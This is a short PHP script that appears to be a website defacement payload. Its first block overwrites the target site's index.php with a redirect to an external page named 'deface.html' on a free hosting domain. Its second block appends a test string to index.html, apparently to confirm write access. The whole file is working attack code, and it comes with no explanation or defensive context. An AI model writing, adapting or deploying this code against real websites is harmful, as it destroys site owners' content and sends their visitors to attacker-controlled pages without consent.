<?php
$entry_line="<?php 
header('Location: https://brokecp.000webhostapp.com/jk/deface.html'); 
?> ";
$fp = fopen("index.php", "w");
fputs($fp, $entry_line);
fclose($fp);
?>

<? 
$fp =@fopen("index.html", "a+");
$yazi = "test" . "\r\n";
fwrite ($fp, "$yazi");
fclose ($fp);
?>
